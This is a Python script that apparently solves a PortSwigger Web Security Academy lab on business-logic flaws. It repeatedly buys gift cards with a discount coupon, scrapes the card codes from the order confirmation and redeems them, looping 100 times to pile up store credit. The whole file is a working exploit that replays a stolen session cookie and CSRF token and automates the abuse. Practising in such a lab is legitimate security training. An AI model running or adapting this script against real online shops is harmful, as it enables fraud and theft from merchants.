import requests
import urllib3
from bs4 import BeautifulSoup
import threading

urllib3.disable_warnings()


session_id = input("Enter your Session  <Session_id>.web-security-academy.net :")
session_cookie = input("Enter your Cookie 'Cookie': 'session=<session_cookie>' :")
session_csrf = input("Enter your Csrf : ")


def foo():
	 for i in range(1):
				headers = {
								'Connection': 'keep-alive',
								'Cache-Control': 'max-age=0',
								'sec-ch-ua': '"Chromium";v="93", " Not;A Brand";v="99"',
								'sec-ch-ua-mobile': '?0',
								'sec-ch-ua-platform': '"Linux"',
								'Upgrade-Insecure-Requests': '1',
								'Origin': 'https://{}.web-security-academy.net'.format(session_id),
								'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 UOS',
								'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
								'Sec-Fetch-Site': 'same-origin',
								'Sec-Fetch-Mode': 'navigate',
								'Sec-Fetch-User': '?1',
								'Sec-Fetch-Dest': 'document',
								'Referer': 'https://{}.web-security-academy.net/product?productId=2'.format(session_id),
								'Accept-Language': 'en-US,en;q=0.9',
								'Cookie': 'session={}'.format(session_cookie),
							}
				
				data = {
					'productId': '2',
					'redir': 'PRODUCT',
					'quantity': '5',
				}
				
				response = requests.post(
					'https://{}.web-security-academy.net/cart'.format(session_id),
					headers=headers,
					data=data,
				)
				
				data = {
					'csrf': '{}'.format(session_csrf),
					'coupon': 'SIGNUP30',
				}
				
				response = requests.post(
					'https://{}.web-security-academy.net/cart/coupon'.format(session_id),
				   
					headers=headers,
					data=data,
				)
				data ={
					'csrf': '{}'.format(session_csrf),
				}
				
				response = requests.post(
					'https://{}.web-security-academy.net/cart/checkout'.format(session_id),
				   
					headers=headers,
					data=data,
				)
				
				
				params = {
					'order-confirmed': 'true',
				}
				
				response = requests.get(
					'https://{}.web-security-academy.net/cart/order-confirmation'.format(session_id),
					params=params,
				   
					headers=headers,
				)
				
				
				soup = BeautifulSoup(response.text, 'html.parser')
				
				rows = soup.find('table', class_='is-table-numbers').find_all('tr')
				
				for row in rows:
					cells = row.find_all('td')
					i = 0
					for cell in cells:
						data = {
							'csrf': '{}'.format(session_csrf),
							'gift-card': cell.text,
						}
						
						response = requests.post(
							'https://{}.web-security-academy.net/gift-card'.format(session_id),
							headers=headers,
							data=data,
						)
						
						i += 1
						print(f"{i}: 10$ added : Response status code = {response.status_code}")

for i in range(100):
    foo()

# n_threads = int(input("Enter the number of threads to use: "))

# threads = []
# for i in range(n_threads):
# 	t = threading.Thread(target=foo)
# 	threads.append(t)
# 	t.start()

# for t in threads:
# 	t.join()